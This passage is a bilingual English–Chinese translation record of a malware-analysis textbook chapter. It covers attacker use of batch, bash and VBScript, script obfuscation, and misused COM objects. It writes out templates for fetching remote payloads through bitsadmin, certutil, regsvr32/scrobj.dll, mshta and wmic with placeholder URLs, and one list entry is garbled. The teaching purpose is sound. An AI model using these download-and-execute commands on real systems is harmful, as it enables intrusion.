- en: '10'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '10'
- en: Scripts and Macros – Reversing, Deobfuscation, and Debugging
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 脚本和宏 – 逆向工程、去混淆和调试
- en: Writing malware nowadays is a business, and, like any business, it aims to be
    as profitable as possible by reducing development and operational costs. Another
    strong advantage is being able to quickly adapt to changing requirements and the
    environment. Therefore, as modern systems become more and more diverse and low-level
    malware has to be more specific to its task, for basic operations, such as actual
    payload delivery, attackers tend to choose approaches that work on multiple platforms
    and require a minimum amount of effort to develop and upgrade. As a result, it
    is no surprise that scripting languages have become increasingly popular among
    attackers as many of them satisfy both of these criteria.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 现在编写恶意软件已经成为一种商业行为，像任何生意一样，它的目标是通过降低开发和运营成本来尽可能地提高利润。另一个强大的优势是能够迅速适应不断变化的需求和环境。因此，随着现代系统变得越来越多样化，低级恶意软件需要更加特定地针对其任务，对于基本操作，如实际有效载荷的交付，攻击者倾向于选择那些可以在多个平台上运行并且开发和升级所需的工作量最小的方法。因此，脚本语言在攻击者中越来越受欢迎也就不足为奇了，因为它们满足了这两个条件。
- en: In addition to this, the traditional attacker requirements are still valid,
    such as being as stealthy as possible to successfully achieve malicious goals.
    If the script interpreter is already available on the target system, then the
    code will be of a relatively small size. Another reason for this anti-detection
    is that many traditional antivirus engines support binary and string signatures
    quite well, but to properly detect obfuscated code scripts, a syntax parser or
    emulator is required, and this might be costly for the antivirus company to develop
    and support. All of this makes scripts a perfect choice for first-stage modules.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 除此之外，传统的攻击者需求依然有效，比如尽可能保持隐蔽，以成功实现恶意目标。如果脚本解释器已经存在于目标系统上，那么代码的体积相对较小。另一个反侦察的原因是，许多传统的杀毒引擎对二进制和字符串签名的支持相当好，但要正确检测混淆代码脚本，则需要语法解析器或模拟器，而这可能需要杀毒公司投入较高的成本来开发和支持。所有这些因素使得脚本成为第一阶段模块的完美选择。
- en: 'In this chapter, we will cover the following topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们将涵盖以下主题：
- en: Classic shell script languages
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 经典的 Shell 脚本语言
- en: VBScript explained
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: VBScript 解释
- en: VBA and Excel 4.0 (XLM) macros and more
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: VBA 和 Excel 4.0 (XLM) 宏等
- en: The power of PowerShell
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: PowerShell 的强大功能
- en: Handling JavaScript
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 处理 JavaScript
- en: Behind C&C – even malware has its own backend
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: C&C 背后——即便是恶意软件也有自己的后端
- en: Other script languages
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 其他脚本语言
- en: Classic shell script languages
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 经典的 Shell 脚本语言
- en: 'All modern operating systems support a command language of some kind, which
    is generally available through the shell. Their functionality varies from system
    to system. Some command languages might be powerful enough to be used as full-fledged
    script languages, while others support only the minimal syntax that is required
    to interact with the machine. In this chapter, we will cover the two most common
    examples: bash scripting for Unix and Linux and batch files for the Windows platform.'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 所有现代操作系统都支持某种命令语言，这些命令语言通常可以通过 Shell 访问。它们的功能因系统而异。一些命令语言可能足够强大，可以作为完整的脚本语言使用，而其他的则只支持与机器交互所需的最基本语法。在本章中，我们将涵盖两个最常见的例子：Unix
    和 Linux 的 bash 脚本，以及 Windows 平台的批处理文件。
- en: Windows batch scripting
  id: totrans-14
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Windows 批处理脚本
- en: The Windows batch scripting language was created mainly to facilitate certain
    administrative tasks and not to completely replace other full-fledged alternatives.
    While it supports certain programming concepts, such as functions and loops, some
    quite basic operations, such as string manipulations, might be less obvious to
    implement compared to many other programming languages. The code can be executed
    directly from the `cmd.exe` console interface or by creating a file with the `.cmd`
    or `.bat` extensions. Note that the commands are case insensitive.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 批处理脚本语言的创建主要是为了简化某些管理任务，而不是完全取代其他成熟的替代方案。虽然它支持某些编程概念，如函数和循环，但一些非常基础的操作，如字符串操作，可能比许多其他编程语言的实现更加不直观。代码可以直接从
    `cmd.exe` 控制台界面执行，或者通过创建一个 `.cmd` 或 `.bat` 扩展名的文件来执行。请注意，命令是不区分大小写的。
- en: 'The list of supported commands remains quite limited, even today. All commands
    can be split into two groups, as follows:'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 即使到今天，支持的命令列表仍然相当有限。所有命令可以分为两组，如下所示：
- en: '`call`: This command executes functionality from the current batch file or
    another batch file, or executes a program'
  id: totrans-17
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`call`：此命令执行当前批处理文件或另一个批处理文件的功能，或执行一个程序。'
- en: '`start`: This command executes a program or opens a file according to its extension'
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`start`：此命令根据文件扩展名执行程序或打开文件。'
- en: '`cd`: This command changes the current directory'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`cd`：此命令更改当前目录。'
- en: '`dir`: This command lists filesystem objects'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`dir`：此命令列出文件系统对象。'
- en: '`copy`: This command copies filesystem objects to a new location'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`copy`：此命令将文件系统对象复制到新位置。'
- en: '`move`: This command moves filesystem objects to another location'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`move`：此命令将文件系统对象移动到另一个位置。'
- en: '`del`/`erase`: These commands delete existing files (not directories)'
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`del`/`erase`：这些命令删除现有文件（非目录）。'
- en: '`rd`/`rmdir`: These commands delete directories (not files)'
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`rd`/`rmdir`：这些命令删除目录（非文件）。'
- en: '`ren`/`rename`: These commands change the names of the filesystem objects'
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ren`/`rename`：这些命令更改文件系统对象的名称。'
- en: '`at`: This schedules a program to execute at a certain time.*   `attrib`: This
    displays or changes the filesystem object attributes; for example, the `system`,
    `read-only`, or `hidden` attributes.*   `cacls`: This displays or changes the
    `find`: This searches for particular filesystem objects; for example, by filename,
    by path, or by extension.*   `format`: This formats a disk potentially overwriting
    the previous content.*   `ipconfig`: This displays and renews the network configuration
    for the local machine.*   `net`: This is a multifunctional tool that supports
    various network operations, including user (`net user`) and remote resource (`net
    use`/`net share`) administration, service management (`net start`/`net stop`),
    and more.*   `ping`: This tool checks the connectivity to remote resources by
    using ICMP packets. It can also be used to establish a subvert network channel
    and exfiltrate data.*   `reg`: This performs various registry-related operations,
    such as `reg query`, `reg add`, `reg delete`, and so on.*   `robocopy`/`xcopy`:
    These tools copy filesystem objects to another location.*   `rundll32`: This loads
    the DLL; here, exports by name and by ordinals are both supported.*   `sc`: This
    communicates with Service Control Manager and manages Windows services, including
    creating, stopping, and changing operations.*   `schtasks`: This is a more powerful
    version of the `at` tool; it works by scheduling programs to start at a particular
    time. This is essentially a console alternative to Windows Task Scheduler, and
    it supports local and remote machines.*   `shutdown`: This restarts or shuts down
    the local or remote machine.*   `taskkill`: This terminates processes by either
    name or PID; additionally, it supports both local and remote machines.*   `tasklist`:
    This displays a list of currently running processes; additionally, it supports
    both local and remote machines.'
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`at`：此命令调度程序在某个特定时间执行。*   `attrib`：此命令显示或更改文件系统对象属性；例如，`system`、`read-only`或`hidden`属性。*   `cacls`：此命令显示或更改`find`：此命令搜索特定的文件系统对象；例如，通过文件名、路径或扩展名。*   `format`：此命令格式化磁盘，可能会覆盖先前的内容。*   `ipconfig`：此命令显示并更新本地计算机的网络配置。*   `net`：这是一个多功能工具，支持各种网络操作，包括用户管理（`net
    user`）和远程资源管理（`net use`/`net share`）、服务管理（`net start`/`net stop`）等。*   `ping`：此工具通过使用ICMP数据包检查与远程资源的连接性。它还可以用于建立潜在的网络通道并窃取数据。*   `reg`：此命令执行各种注册表相关操作，如`reg
    query`、`reg add`、`reg delete`等。*   `robocopy`/`xcopy`：这些工具将文件系统对象复制到另一个位置。*   `rundll32`：此命令加载DLL；这里支持按名称和顺序导出的两种方式。*   `sc`：此命令与服务控制管理器通信并管理Windows服务，包括创建、停止和更改操作。*   `schtasks`：这是`at`工具的更强大版本；它通过调度程序在特定时间启动程序。实际上，这是Windows任务调度程序的控制台替代工具，支持本地和远程计算机。*   `shutdown`：此命令重启或关闭本地或远程计算机。*   `taskkill`：此命令通过名称或PID终止进程；此外，支持本地和远程计算机。*   `tasklist`：此命令显示当前运行的进程列表；同时支持本地和远程计算机。'
- en: 'Historically, no standard tools were provided to send HTTP requests (now `curl`
    has become available on modern versions of Windows) or to compress files. From
    the attacker’s perspective, this means that to implement more or less basic malware
    functionality, such as downloading, decrypting, and executing additional payloads,
    they must write extra code. Only later did system tools such as `bitsadmin` and
    `certutil` become commonly misused by attackers to download and decode the payloads.
    Here are some examples of how they were used:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 从历史上看，没有提供标准工具来发送 HTTP 请求（现在 `curl` 已在现代版本的 Windows 上可用）或压缩文件。从攻击者的角度来看，这意味着为了实现更多或更基本的恶意软件功能，例如下载、解密和执行附加有效载荷，他们必须编写额外的代码。直到后来，像
    `bitsadmin` 和 `certutil` 这样的系统工具才被攻击者广泛滥用，用于下载和解码有效载荷。以下是它们被使用的一些示例：
- en: '`bitsadmin /transfer <any_name> /download /priority normal <url> <dest>`'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`bitsadmin /transfer <any_name> /download /priority normal <url> <dest>`'
- en: '`certutil -urlcache -split -f <url> <dest>`'
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`certutil -urlcache -split -f <url> <dest>`'
- en: '`certutil -decode <src> <dest>`'
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`certutil -decode <src> <dest>`'
- en: 'In addition, there are a few lesser-known ways that Windows malware can access
    the remote payload using standard console commands, as follows:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，还有一些较少为人知的方式，Windows 恶意软件可以通过使用标准控制台命令来访问远程有效载荷，具体如下：
- en: '`regsvr32 /s /n /u /i:<url_to_sct> scrobj.dll`'
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`regsvr32 /s /n /u /i:<url_to_sct> scrobj.dll`'
- en: '`mshta <url_to_hta>`'
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`mshta <url_to_hta>`'
- en: '`wmic os get /FORMAT:<url_to_xsl>`'
  id: totrans-34
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`wmic os get /FORMAT:<url_to_xsl>`'
- en: Finally, some standard tools such as `wmic` natively support remote machines,
    so it is possible to execute certain commands on another victim’s machine if there
    are available credentials without the extra tools required.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，一些标准工具如 `wmic` 原生支持远程机器，因此如果有可用的凭证，就可以在另一台受害者的机器上执行某些命令，而无需额外的工具。
- en: 'More non-standard security-related applications for standard tools can be found
    on the **LOLBAS** project page: [https://lolbas-project.github.io/](https://lolbas-project.github.io/).'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 更多与标准工具相关的非标准安全应用可以在 **LOLBAS** 项目页面找到：[https://lolbas-project.github.io/](https://lolbas-project.github.io/)。
- en: 'The most common obfuscation patterns for batch files are as follows:'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 批处理文件中最常见的混淆模式如下：
- en: Building commands by taking substrings from long blocks.
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过从长块中提取子字符串来构建命令。
- en: Using excessive variable replacements; here, many variables are either not defined
    or are defined somewhere far from their place of use.
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用过多的变量替换；这里，许多变量要么未定义，要么在使用的地方远离定义的位置。
- en: Using long variable names of random uppercase and lowercase letters.
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用随机大小写字母的长变量名。
- en: 'Adding multiple meaningless symbols such as pairs of double quotes or caret
    escape characters (`^`). An example can be seen in the following screenshot:'
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 添加多个无意义的符号，如成对的双引号或插入符号转义字符 (`^`)。以下截图展示了一个示例：
- en: '![Figure 10.1 – An example of batch script obfuscation using escape symbols'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.1 – 使用转义符号进行批处理脚本混淆的示例'
- en: '](img/Figure_10.1_B18500.jpg)'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.1_B18500.jpg)'
- en: Figure 10.1 – An example of batch script obfuscation using escape symbols
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.1 – 使用转义符号进行批处理脚本混淆的示例
- en: 'Mixing uppercase and lowercase letters in general (the Windows console is case
    insensitive unless the case makes a difference; for example, in base64 encoding).
    Here is an example:'
  id: totrans-45
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通常情况下，大小写字母混合使用（Windows 控制台不区分大小写，除非大小写有区别；例如在 base64 编码中）。以下是一个示例：
- en: '![Figure 10.2 – An example of batch script obfuscation using non-existing variables'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.2 – 使用不存在的变量进行批处理脚本混淆的示例'
- en: '](img/Figure_10.2_B18500.jpg)'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.2_B18500.jpg)'
- en: Figure 10.2 – An example of batch script obfuscation using non-existing variables
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.2 – 使用不存在的变量进行批处理脚本混淆的示例
- en: The first and second cases can be handled by just printing the results of these
    operations using the `echo` command. The third and fourth cases can easily be
    handled by basic replacement operations, while the fifth case can be handled by
    just making everything lowercase except for things such as base64-encoded text.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 第一和第二种情况可以通过仅使用 `echo` 命令打印这些操作的结果来处理。第三和第四种情况可以通过基本的替换操作轻松处理，而第五种情况则只需将所有内容转换为小写，除了像
    base64 编码的文本等内容。
- en: Bash
  id: totrans-50
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Bash
- en: Bash is a command-line interface that is native to the Unix world. It follows
    the *one task one tool* paradigm, where multiple simple programs can be chained
    together. The shell scripting supports fundamental programming blocks, such as
    loops, conditional constructs, and functions. In addition to this, it is powered
    by multiple external tools – most of which can be found on any supported system.
    Yet, unlike the Windows shell, which has multiple built-in commands, even the
    most basic functions, such as printing a string, are done by an independent program
    (in this case, `echo`). The common file extension for shell scripts is `.sh`.
    However, even a file without any extension will be executed properly if the corresponding
    interpreter is provided in the header; for example, `#!/bin/bash`. Unlike Windows,
    here, all commands are case sensitive.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: Bash 是一个命令行界面，源于 Unix 世界。它遵循*一项任务一工具*的范式，在这个范式下，多个简单的程序可以连接在一起使用。Shell 脚本支持基本的编程构件，如循环、条件构造和函数。除此之外，它还通过多个外部工具提供支持——大多数可以在任何支持的系统上找到。然而，不同于
    Windows 的 Shell（它有多个内建命令），即使是最基本的功能，如打印字符串，也由一个独立的程序完成（在这种情况下是 `echo`）。Shell 脚本的常见文件扩展名是
    `.sh`。然而，即使是没有扩展名的文件，只要在头部提供了相应的解释器，也能正确执行；例如，`#!/bin/bash`。与 Windows 不同，在这里所有命令都是区分大小写的。
- en: There are many other shells in the Linux world, such as `sh` or `zsh`, but their
    syntax is largely the same.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Linux 世界中还有许多其他的 Shell，如 `sh` 或 `zsh`，但它们的语法大体相同。
- en: 'As most Linux tools provide only a tiny piece of functionality, the full-fledged
    attack will involve many of them. However, some of them are used more often by
    attackers to achieve their goals, especially in mass-infection malware such as
    **Mirai**:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 由于大多数 Linux 工具只提供一小部分功能，因此完整的攻击通常涉及许多工具。然而，其中一些工具被攻击者更频繁地使用，以实现他们的目标，尤其是在大规模感染的恶意软件中，如**Mirai**：
- en: '`chmod`: This changes permissions; for example, to make a file readable, writable,
    or executable.'
  id: totrans-54
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`chmod`：更改文件权限；例如，使文件可读、可写或可执行。'
- en: '`cd`: This changes the current directory.'
  id: totrans-55
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`cd`：更改当前目录。'
- en: '`cp`: This copies filesystem objects to another location.'
  id: totrans-56
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`cp`：将文件系统中的对象复制到另一个位置。'
- en: '`curl`: This network tool is used to transfer data to and from remote servers
    through multiple supported protocols.'
  id: totrans-57
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`curl`：这是一个网络工具，用于通过多种支持的协议从远程服务器传输数据。'
- en: '`find`: This searches for particular filesystem objects by name and certain
    attributes.'
  id: totrans-58
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`find`：根据名称和某些属性搜索特定的文件系统对象。'
- en: '`grep`: This searches for particular strings in a file or files containing
    particular strings.'
  id: totrans-59
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`grep`：在文件或包含特定字符串的文件中搜索特定字符串。'
- en: '`ls`: This lists filesystem objects.'
  id: totrans-60
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ls`：列出文件系统中的对象。'
- en: '`mv`: This moves filesystem objects.'
  id: totrans-61
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`mv`：移动文件系统中的对象。'
- en: '`nc`: This is a netcat tool that allows the attacker to read from and write
    to network connections using TCP or UDP. By default, it is not available on some
    distributions.'
  id: totrans-62
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`nc`：这是一个 netcat 工具，允许攻击者使用 TCP 或 UDP 从网络连接中读取和写入数据。默认情况下，在某些发行版上不可用。'
- en: '`ping`: This checks the access to a remote system by sending ICMP packets.'
  id: totrans-63
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ping`：通过发送 ICMP 数据包检查对远程系统的访问。'
- en: '`ps`: This lists processes.'
  id: totrans-64
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ps`：列出进程。'
- en: '`rm`: This deletes filesystem objects.'
  id: totrans-65
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`rm`：删除文件系统中的对象。'
- en: '`tar`: This compresses and decompresses files using multiple supported protocols.'
  id: totrans-66
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`tar`：使用多种支持的协议压缩和解压文件。'
- en: '`tftp`: This is a client for **Trivial File Transfer Protocol** (**TFTP**);
    it is a simpler version of FTP.'
  id: totrans-67
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`tftp`：这是 **简易文件传输协议**（**TFTP**）的客户端；它是 FTP 的简化版本。'
- en: '`wget`: This downloads files over the HTTP, HTTPS, and FTP protocols:'
  id: totrans-68
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`wget`：通过 HTTP、HTTPS 和 FTP 协议下载文件：'
- en: '![Figure 10.3 – An example of Mirai’s shell script'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.3 – Mirai Shell 脚本示例'
- en: '](img/Figure_10.3_B18500.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.3_B18500.jpg)'
- en: Figure 10.3 – An example of Mirai’s shell script
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.3 – Mirai Shell 脚本示例
- en: Just like for malware written in any other programming language, obfuscation
    can be incorporated here to slow down the reverse engineering process and bypass
    basic signature detection. Multiple approaches are possible in theory, such as
    dynamically decoding and executing commands, using crazy variable names, or applying
    `sed`/`awk` string replacements. However, it is worth mentioning that modern IoT
    malware still doesn’t incorporate any sophisticated tricks. This is mainly because
    the scripts that are used are quite generic and, often, they can only be reliably
    detected if the corresponding network IOC is known or if the final payload is
    detected.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 就像任何其他编程语言编写的恶意软件一样，这里也可以加入混淆技术来延缓逆向工程过程，并绕过基本的签名检测。理论上，有多种方法可以实现，如动态解码和执行命令、使用奇怪的变量名，或者应用
    `sed`/`awk` 字符串替换。然而，值得一提的是，现代物联网恶意软件仍然没有采用任何复杂的技术手段。这主要是因为所使用的脚本非常通用，通常只有在知道相应的网络
    IOC 或检测到最终有效载荷时，才能可靠地检测到它们。
- en: That’s pretty much everything we need to know about shell scripts. Now, it’s
    time to talk about full-fledged programming languages. In particular, let’s start
    with Microsoft **Visual Basic Scripting Edition** (**VBScript**)-based threats.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 这就是我们需要了解的关于 shell 脚本的全部内容。现在，是时候讨论完整的编程语言了。特别地，让我们从微软的 **Visual Basic 脚本版**（**VBScript**）威胁开始。
- en: VBScript explained
  id: totrans-74
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: VBScript 解释
- en: VBScript was the first mainstream programming language embedded into Windows
    OS. It has been actively used by system administrators to automate certain types
    of tasks without the need to install any third-party software. Available on all
    modern Microsoft systems, it gradually became a popular choice for malware writers
    who were looking for a guaranteed way of performing certain actions without any
    need to recompile the associated code.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: VBScript 是第一个嵌入 Windows 操作系统的主流编程语言。系统管理员长期以来一直积极使用它来自动化某些类型的任务，而无需安装任何第三方软件。它适用于所有现代微软系统，逐渐成为恶意软件编写者的流行选择，因为它提供了一种无需重新编译关联代码就能执行特定操作的可靠方法。
- en: At the time of writing, Microsoft has decided to switch to PowerShell to handle
    administrative tasks and has left all future VBScript support to the ASP.NET framework.
    So far, there are no plans to discontinue it in future Windows releases.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 在撰写本文时，微软已决定转向 PowerShell 来处理管理任务，并将未来所有的 VBScript 支持交给 ASP.NET 框架。目前，尚无计划在未来的
    Windows 版本中停止支持它。
- en: The native file extension for VBScript files is `.vbs`, but it is also possible
    to encode them into files using a `.vbe` extension. Additionally, they can be
    embedded into Windows script files (`.wsf`) or HTML application (`.hta`) files.
    `.vbs`, `.vbe`, and `.wsf` files can be executed either by `wscript.exe`, which
    provides the proper GUI, or `cscript.exe`, which is the console alternative. `.hta`
    files can be executed by the `mshta.exe` tool. VBScript code can also be executed
    directly from the command line using the `mshta vbscript:<script_body>` syntax.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: VBScript 文件的本地文件扩展名为 `.vbs`，但也可以将其编码为使用 `.vbe` 扩展名的文件。此外，它们还可以嵌入到 Windows 脚本文件（`.wsf`）或
    HTML 应用程序（`.hta`）文件中。`.vbs`、`.vbe` 和 `.wsf` 文件可以通过 `wscript.exe` 执行，该程序提供了适当的
    GUI，或者通过 `cscript.exe` 执行，该程序是控制台替代品。`.hta` 文件可以通过 `mshta.exe` 工具执行。VBScript 代码还可以通过命令行直接执行，使用
    `mshta vbscript:<script_body>` 语法。
- en: Basic syntax
  id: totrans-78
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 基本语法
- en: 'Initially, this technology was intended to be used by web developers and this
    fact drastically affected the syntax. VBScript is modeled on Visual Basic and
    has similar programming elements, such as conditional structures, loop structures,
    objects, and embedded functions. Data types are slightly different to work with:
    for example, all variables in VBScript have the `Variant` type by default.'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 最初，这项技术是为了供 Web 开发人员使用的，这一事实极大地影响了其语法。VBScript 模仿了 Visual Basic，并具有类似的编程元素，例如条件结构、循环结构、对象和嵌入函数。数据类型略有不同，例如，VBScript
    中所有变量默认都是 `Variant` 类型。
- en: Most of this high-level functionality can be accessed in the corresponding **Microsoft
    Component Object Model** (**COM**) objects. COM is a distributed system for creating
    and interacting with software components.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数这些高级功能可以通过相应的 **微软组件对象模型**（**COM**）对象访问。COM 是一个分布式系统，用于创建和交互软件组件。
- en: 'Here are some COM objects and the corresponding methods and properties that
    are often misused by attackers:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是一些常被攻击者误用的 COM 对象及其相应的方法和属性：
- en: '`WScript.Shell`: This gives access to multiple system-wide operations, as follows:'
  id: totrans-82
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`WScript.Shell`：这提供了对多个系统范围操作的访问，如下所示：'
- en: '`RegRead`/`RegDelete`/`RegWrite`: These interact with the Windows registry
    to check the presence of certain software (such as an antivirus program), tamper
    with its functionality, delete traces of an activity, or add a module to autorun.'
  id: totrans-83
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`RegRead`/`RegDelete`/`RegWrite`：这些操作与Windows注册表交互，用于检查特定软件的存在（如防病毒程序），篡改其功能，删除活动痕迹，或添加模块以启动自动运行。'
- en: '`Run`: This is used to run an application.'
  id: totrans-84
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Run`：此功能用于运行应用程序。'
- en: '`Shell.Application`: This allows for more system-related functionality, as
    follows:'
  id: totrans-85
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Shell.Application`：此功能提供更多与系统相关的功能，具体如下：'
- en: '`GetSystemInformation`: This acquires various system information, for example,
    the size of the memory available to identify sandboxes'
  id: totrans-86
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetSystemInformation`：此功能获取各种系统信息，例如可用内存的大小，以识别沙箱环境。'
- en: '`ServiceStart`: This starts a service; for example, one that is associated
    with a persistent module'
  id: totrans-87
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ServiceStart`：此功能用于启动服务，例如与持久性模块相关联的服务。'
- en: '`ServiceStop`: This stops a service; for example, one that belongs to antivirus
    software'
  id: totrans-88
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ServiceStop`：此功能用于停止服务，例如属于防病毒软件的服务。'
- en: '`ShellExecute`: This runs a script or an application'
  id: totrans-89
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ShellExecute`：此功能用于运行脚本或应用程序。'
- en: '`Scripting.FileSystemObject`: This gives access to filesystem operations, as
    follows:'
  id: totrans-90
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Scripting.FileSystemObject`：此功能提供对文件系统操作的访问，具体如下：'
- en: '`CreateTextFile`/`OpenTextFile`: This creates or opens a file.'
  id: totrans-91
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`CreateTextFile`/`OpenTextFile`：此功能用于创建或打开文件。'
- en: '`ReadLine`/`ReadAll`: This reads the content of a file; for example, a file
    that contains some information of interest or another encrypted module.'
  id: totrans-92
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ReadLine`/`ReadAll`：此功能用于读取文件内容，例如包含某些重要信息或其他加密模块的文件。'
- en: '`Write`/`WriteLine`: This writes to the opened file; for example, to overwrite
    an important file or configuration with other content, or to deliver the next
    attack stage or an obfuscated payload.'
  id: totrans-93
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Write`/`WriteLine`：此功能用于向已打开的文件写入内容，例如覆盖重要文件或配置文件的内容，或传递下一阶段的攻击或混淆的有效载荷。'
- en: '`GetFile`: This returns a `File` object that provides access to multiple file
    properties and several useful methods:'
  id: totrans-94
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetFile`：此功能返回一个`File`对象，提供对多个文件属性和一些有用方法的访问。'
- en: '`Copy`/`Move`: This copies or moves files to the specified location'
  id: totrans-95
  prefs:
  - PREF_IND
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Copy`/`Move`：此功能用于将文件复制或移动到指定位置。'
- en: '`Delete`: This deletes the corresponding file'
  id: totrans-96
  prefs:
  - PREF_IND
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Delete`：此功能用于删除相应的文件。'
- en: '`Attributes`: This property can be modified to change the file’s attributes'
  id: totrans-97
  prefs:
  - PREF_IND
  - PREF_IND
